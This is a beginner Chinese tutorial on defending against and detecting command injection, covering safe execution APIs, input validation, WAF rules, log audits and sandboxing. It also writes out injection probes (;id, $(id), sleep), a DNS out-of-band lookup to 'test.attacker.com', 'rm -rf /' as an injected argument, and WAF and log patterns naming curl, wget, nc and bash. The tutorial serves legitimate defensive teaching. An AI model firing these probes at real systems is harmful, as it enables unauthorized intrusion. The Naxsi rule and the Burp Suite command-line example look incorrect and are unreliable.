---
order: 480
title: Cybersecurity 命令注入防御与检测
module: 033-cybersecurity
category: '033-cybersecurity'
difficulty: beginner
description: Cybersecurity 命令注入防御与检测 的完整教学讲解。
author: fanquanpp
updated: '2026-08-01'
related: []
prerequisites: []
---
## 命令注入原理检测

**基本写法:常见分隔符探测**
`<输入>; <命令> | <输入> | <命令>`
```bash
# 探测命令分隔符是否生效
;id
|id
`id`
$(id)
&&id
||id
```

**基本写法:测试命令注入回显**
`curl -s "<URL>?param=;id"`
```bash
# 通过 URL 参数测试命令注入回显
curl -s "https://example.com/ping?host=127.0.0.1;id"
```

**基本写法:测试延迟型注入**
`curl -s "<URL>?param=;sleep+5"`
```bash
# 通过 sleep 命令验证盲注入
time curl -s "https://example.com/ping?host=127.0.0.1;sleep+5"
```

**基本写法:DNS 带外检测**
`curl -s "<URL>?param=;nslookup+<子域>.<攻击域名>"`
```bash
# 通过 DNS 查询外带命令执行结果
curl -s "https://example.com/ping?host=127.0.0.1;nslookup+test.attacker.com"
```

---

## 命令注入防御(代码层)

**基本写法:Python 使用 subprocess 列表参数**
`subprocess.run(["cmd", arg1, arg2])`
```bash
# Python 使用列表传参避免 shell 注入
# subprocess.run(["ping", "-c", "1", host], shell=False)
```

**基本写法:Python 白名单校验输入**
`re.match(r"^[a-zA-Z0-9._-]+$", <输入>)`
```bash
# 使用正则白名单校验输入参数
python3 -c "import re; print(bool(re.match(r'^[a-zA-Z0-9._-]+$', '127.0.0.1')))"
```

**基本写法:Python 转义 shell 参数**
`shlex.quote(<参数>)`
```bash
# 使用 shlex.quote 转义 shell 参数
python3 -c "import shlex; print(shlex.quote('127.0.0.1; rm -rf /'))"
```

**基本写法:Node.js 安全执行**
`execFile("ping", ["-c", "1", host])`
```bash
# Node.js 使用 execFile 替代 exec
# const { execFile } = require('child_process');
# execFile('ping', ['-c', '1', host], callback);
```

**基本写法:PHP 安全执行**
`escapeshellarg(<参数>)`
```bash
# PHP 使用 escapeshellarg 转义参数
php -r "echo escapeshellarg('127.0.0.1; rm -rf /');"
```

---

## 危险函数审计

**基本写法:Python 检索危险函数**
`grep -rn "os.system\|subprocess\|popen\|eval\|exec" <项目目录>`
```bash
# 检索 Python 项目中的危险执行函数
grep -rn "os.system\|subprocess.call\|os.popen\|eval\|exec" src/
```

**基本写法:PHP 检索危险函数**
`grep -rn "system\|exec\|passthru\|shell_exec\|popen" <项目目录>`
```bash
# 检索 PHP 项目中的命令执行函数
grep -rn "system\|exec\|passthru\|shell_exec\|popen\|proc_open" src/
```

**基本写法:Node.js 检索危险函数**
`grep -rn "exec\|execSync\|spawn" <项目目录>`
```bash
# 检索 Node.js 项目中的命令执行函数
grep -rn "child_process\|exec(\|execSync\|spawn(" src/
```

**基本写法:Java 检索危险函数**
`grep -rn "Runtime.getRuntime\|ProcessBuilder" <项目目录>`
```bash
# 检索 Java 项目中的命令执行
grep -rn "Runtime.getRuntime\|ProcessBuilder\|exec(" src/
```

**基本写法:统计危险函数使用次数**
`grep -rc "system\|exec\|popen" <项目目录> | grep -v ":0"`
```bash
# 统计每个文件中危险函数出现次数
grep -rc "system\|exec\|popen" src/ | grep -v ":0" | sort -t: -k2 -rn
```

---

## 输入校验与过滤

**基本写法:校验 IP 格式**
`python3 -c "import ipaddress; ipaddress.ip_address('<IP>')"`
```bash
# 校验输入是否为合法 IP
python3 -c "import ipaddress; print(ipaddress.ip_address('127.0.0.1'))"
```

**基本写法:校验数字格式**
`[[ "<输入>" =~ ^[0-9]+$ ]]`
```bash
# 使用 bash 正则校验数字输入
[[ "12345" =~ ^[0-9]+$ ]] && echo "合法" || echo "非法"
```

**基本写法:校验域名格式**
`python3 -c "import re; print(bool(re.match(r'^[a-zA-Z0-9.-]+$', '<域名>')))"`
```bash
# 校验输入是否为合法域名格式
python3 -c "import re; print(bool(re.match(r'^[a-zA-Z0-9.-]+$', 'example.com')))"
```

**基本写法:过滤危险字符**
`<输入> | sed 's/[;&|$\`\\]//g'`
```bash
# 过滤命令注入相关危险字符
echo "127.0.0.1;id" | sed 's/[;&|$\`\\]//g'
```

**基本写法:白名单字符校验**
`python3 -c "print(all(c.isalnum() or c in '.-_' for c in '<输入>'))"`
```bash
# 使用白名单字符校验输入
python3 -c "print(all(c.isalnum() or c in '.-_' for c in '127.0.0.1'))"
```

---

## 操作系统层防御

**基本写法:查看进程执行命令**
`cat /proc/<pid>/cmdline | tr '\0' ' '`
```bash
# 查看进程的完整命令行参数
cat /proc/1234/cmdline | tr '\0' ' '
```

**基本写法:监控 execve 系统调用**
`strace -e trace=execve -p <pid>`
```bash
# 跟踪进程的命令执行行为
strace -e trace=execve -p 1234
```

**基本写法:限制命令执行权限**
`chmod 750 <命令>`
```bash
# 限制危险命令的执行权限
chmod 750 /usr/bin/curl /usr/bin/wget
```

**基本写法:使用 sudo 限制可执行命令**
`<用户> ALL=(root) NOPASSWD: /usr/bin/<命令>`
```bash
# sudoers 限制仅能执行特定命令
# www-data ALL=(root) NOPASSWD: /usr/bin/systemctl restart nginx
```

---

## Web 应用防火墙规则

**基本写法:ModSecurity 命令注入规则**
`SecRule ARGS "@rx [;&|$\`\\(]" "deny"`
```bash
# ModSecurity 拦截命令分隔符
SecRule ARGS "@rx [;&|$\`\\(]" "id:1003,deny,status:403,log,msg:'Command Injection'"
```

**基本写法:拦截常见命令名**
`SecRule ARGS "@rx \b(id|whoami|uname|cat|ls|wget|curl)\b" "deny"`
```bash
# ModSecurity 拦截常见命令名
SecRule ARGS "@rx (?i)\b(id|whoami|uname|cat|ls|wget|curl|nc|bash|sh)\b" "id:1004,deny,status:403"
```

**基本写法:Nginx 拦截危险字符**
`if ($args ~* "[;&|$\`]") { return 403; }`
```bash
# Nginx 拦截查询参数中的危险字符
if ($args ~* "[;&|$\`]") {
    return 403;
}
```

**基本写法:Naxsi 命令注入规则**
`CheckRule "$SQL >= 8" DENY;`
```bash
# Naxsi WAF 命令注入拦截规则
BasicRule wl:1001 "msg:command injection";
```

---

## 命令注入检测工具

**基本写法:使用 commix 检测**
`python3 commix.py --url="<URL>" --data="<参数>"`
```bash
# 使用 commix 自动化命令注入检测
python3 commix.py --url="https://example.com/ping" --data="host=127.0.0.1"
```

**基本写法:commix 指定注入点**
`python3 commix.py --url="<URL>" --data="*" --level=3`
```bash
# 自动识别注入点并使用高等级检测
python3 commix.py --url="https://example.com/api?host=127.0.0.1*" --level=3
```

**基本写法:使用 sqlmap 检测操作系统命令**
`sqlmap -u "<URL>" --os-cmd="id"`
```bash
# sqlmap 检测命令注入并执行命令
sqlmap -u "https://example.com/ping?host=127.0.0.1" --os-cmd="id"
```

**基本写法:Burp Suite 主动扫描**
`java -jar burpsuite_pro.jar --scan --url <URL>`
```bash
# Burp 命令行启动扫描
java -jar burpsuite_pro.jar --scan --url https://example.com/ping?host=127.0.0.1
```

---

## 命令注入日志审计

**基本写法:检索可疑 URL 编码命令**
`grep -iE "(%3B|%7C|%60|%24|%26)" <访问日志>`
```bash
# 检索 URL 编码的命令分隔符
grep -iE "(%3B|%7C|%60|%24|%26)" /var/log/nginx/access.log
```

**基本写法:检索明文命令关键字**
`grep -iE "\b(id|whoami|uname|cat|ls|wget|curl|nc|bash)\b" <日志>`
```bash
# 检索访问日志中的命令关键字
grep -iE "\b(id|whoami|uname|cat|ls|wget|curl|nc|bash)\b" /var/log/nginx/access.log
```

**基本写法:统计可疑请求来源**
`grep -iE "(%3B|%7C|%60)" <日志> | awk '{print $1}' | sort | uniq -c`
```bash
# 统计命令注入可疑来源 IP
grep -iE "(%3B|%7C|%60)" /var/log/nginx/access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head
```

**基本写法:监控 Web 错误日志**
`tail -f <错误日志> | grep -i "sh:\|bash:\|command not found"`
```bash
# 监控命令执行错误的日志
tail -f /var/log/nginx/error.log | grep -i "sh:\|bash:\|command not found"
```

---

## 沙箱与隔离执行

**基本写法:使用 firejail 沙箱执行**
`firejail --noprofile <命令>`
```bash
# 在沙箱中执行不受信任命令
firejail --noprofile --net=none /usr/bin/ping 127.0.0.1
```

**基本写法:Docker 容器隔离执行**
`docker run --rm --network=none alpine <命令>`
```bash
# 在隔离容器中执行命令
docker run --rm --network=none alpine ping -c 1 127.0.0.1
```

**基本写法:使用 chroot 隔离**
`chroot <目录> <命令>`
```bash
# chroot 改变根目录执行
chroot /var/jail /usr/bin/ping 127.0.0.1
```

**基本写法:限制 shell 访问**
`usermod -s /usr/sbin/nologin <用户>`
```bash
# 限制用户无法获得交互式 shell
usermod -s /usr/sbin/nologin www-data
```

---

## 命令注入防护自检

**基本写法:批量测试参数注入**
`for param in <参数列表>; do curl -s "<URL>?$param=;id" | grep -i "uid="; done`
```bash
# 批量测试接口参数是否存在命令注入
for param in host ip addr domain; do
  echo "测试参数 $param:"
  curl -s "https://example.com/api?$param=127.0.0.1;id" | grep -i "uid="
done
```

**基本写法:验证输入校验有效性**
`curl -s "<URL>?param=127.0.0.1;id"`
```bash
# 验证目标是否过滤命令分隔符
curl -s "https://example.com/ping?host=127.0.0.1;id" | grep -i "uid\|gid"
```

**基本写法:验证是否使用安全 API**
`grep -rn "shell=True" <项目目录>`
```bash
# 检查是否使用 shell=True 危险参数
grep -rn "shell=True" src/
```

**基本写法:检查禁用函数列表**
`php -r "echo ini_get('disable_functions');"`
```bash
# 查看 PHP 禁用的危险函数
php -r "echo ini_get('disable_functions');"
```

## 参考文献

OWASP Top 10：https://owasp.org/www-project-top-ten/
OWASP Cheat Sheets：https://cheatsheetseries.owasp.org/
NIST 网络安全框架：https://www.nist.gov/cyberframework
CWE 数据库：https://cwe.mitre.org/
PortSwigger Web Security Academy：https://portswigger.net/web-security

## 延伸阅读

密码学与证书，见 033-cybersecurity 模块文档。
Web 攻击与防御，见 033-cybersecurity 模块相关文档。
网络层安全，见 032-networking 模块。
黑马程序员 Bilibili 空间（https://space.bilibili.com/37974444 ）提供网络安全课程。

## 模块文档速查表

| 文档 | 主题 | 与本文的关联 |
| --- | --- | --- |
| 安全基础与防御 | 001-SecurityBasicsDefense | 本文的前置基础 |
| Web安全与渗透测试 | 002-WebSecurityPenetrationTesting | 本文的安全延伸 |
| 二进制安全与应急响应 | 003-BinarySecurityAndIncidentResponse | 本文的安全延伸 |
| 安全工具与实战 | 004-SecurityToolsPractice | 本文的综合应用 |
| XSS攻击 | 005-XSSAttack | 本文的并列主题 |
| 安全模型与框架 | 006-SecurityModelFramework | 本文的安全延伸 |
| CSRF攻击 | 007-CSRFAttack | 本文的并列主题 |
| 密码学应用 | 008-CryptographyApplication | 本文的并列主题 |
| Web安全深度 | 009-WebSecurityDeep | 本文的安全延伸 |
| 安全运营中心 | 010-SOC | 本文的安全延伸 |
| SSRF攻击 | 011-SSRFAttack | 本文的并列主题 |
| 恶意代码分析 | 012-MalwareAnalysis | 本文的并列主题 |
| 云安全 | 013-CloudSecurity | 本文的安全延伸 |
| 对称加密 | 014-SymmetricEncryption | 本文的安全延伸 |
| 应急响应 | 015-IncidentResponse | 本文的并列主题 |
| 非对称加密 | 016-AsymmetricEncryption | 本文的安全延伸 |
| 哈希算法 | 017-HashAlgorithm | 本文的并列主题 |
| 安全开发 | 018-SecureDevelopment | 本文的安全延伸 |
| 合规与审计 | 019-ComplianceAudit | 本文的并列主题 |
| 数字证书 | 020-DigitalCertificate | 本文的并列主题 |
| HTTPS原理 | 021-HTTPSPrinciple | 本文的原理深化 |
| 渗透测试方法论 | 022-PenetrationTestingMethodology | 本文的并列主题 |
| 信息收集 | 023-InformationGathering | 本文的并列主题 |
| 漏洞扫描 | 024-VulnerabilityScan | 本文的并列主题 |
| 安全编码原则 | 025-SecureCodingPrinciples | 本文的安全延伸 |
| 输入验证 | 026-InputValidation | 本文的并列主题 |
| 认证与授权 | 027-AuthenticationAuthorization | 本文的并列主题 |
| OWASP-Top-10详解 | 028-OWASPTop10Detailed | 本文的并列主题 |
| XXE攻击 | 029-XXEAttack | 本文的并列主题 |
| 反序列化漏洞 | 030-DeserializationVulnerability | 本文的并列主题 |
| 零信任架构 | 031-ZeroTrustArchitecture | 本文的原理深化 |
| 身份与访问管理 | 032-IdentityAccessManagement | 本文的并列主题 |
| 安全基线 | 033-SecurityBaseline | 本文的安全延伸 |
| 漏洞扫描工具 | 034-VulnerabilityScanTools | 本文的并列主题 |
| WAF规则 | 035-WAFRule | 本文的并列主题 |
| Cybersecurity OpenSSL 证书管理 | 036-OpenSSLCert | 本文的并列主题 |
| Cybersecurity OpenSSL 加密解密 | 037-OpenSSLEncrypt | 本文的安全延伸 |
| Cybersecurity nmap 端口扫描 | 038-NmapScan | 本文的并列主题 |
| Cybersecurity 哈希工具 | 039-HashTools | 本文的并列主题 |
| Cybersecurity hashcat 密码破解 | 040-Hashcat | 本文的并列主题 |
| Cybersecurity GPG 加密与签名 | 041-GPGEncrypt | 本文的安全延伸 |
| Cybersecurity SSH 密钥管理 | 042-SSHKeys | 本文的并列主题 |
| Cybersecurity 密码哈希 | 043-PasswordHash | 本文的并列主题 |
| Cybersecurity SQL 注入检测与防御 | 044-SQLInjection | 本文的并列主题 |
| Cybersecurity XSS 防御 | 045-XSSDefense | 本文的并列主题 |
| Cybersecurity CSRF 防御命令与配置 | 046-CSRFDefense | 本文的并列主题 |
| Cybersecurity XXE 防御与检测 | 047-XXEDefense | 本文的并列主题 |
| Cybersecurity 命令注入防御与检测 | 048-CommandInjection | 本文自身 |
| Cybersecurity OAuth2/OIDC 配置命令 | 049-OAuth2OIDC | 本文的并列主题 |
| Cybersecurity 防火墙配置(ufw/firewalld) | 050-FirewallConfig | 本文的并列主题 |
| Cybersecurity IDS/IPS 命令(Suricata/Snort) | 051-IDSIPSCommands | 本文的并列主题 |
| Cybersecurity Metasploit 命令(渗透测试) | 052-MetasploitCommands | 本文的并列主题 |
| Cybersecurity Burp Suite 命令行 | 053-BurpSuiteCLI | 本文的并列主题 |
| Cybersecurity Nikto Web 扫描 | 054-NiktoScan | 本文的并列主题 |
| Cybersecurity OpenVAS 漏洞扫描 | 055-OpenVASCommands | 本文的并列主题 |
| Cybersecurity SELinux/AppArmor 强制访问控制 | 056-SELinuxAppArmor | 本文的并列主题 |
| Cybersecurity AIDE 文件完整性检查 | 057-AIDEFileIntegrity | 本文的并列主题 |
| Cybersecurity auditd 审计命令 | 058-AuditdCommands | 本文的并列主题 |
| Cybersecurity 隐写术工具命令 | 059-SteganographyTools | 本文的并列主题 |
| Cybersecurity 逆向工程命令(radare2/ghidra CLI) | 060-ReverseEngineering | 本文的并列主题 |
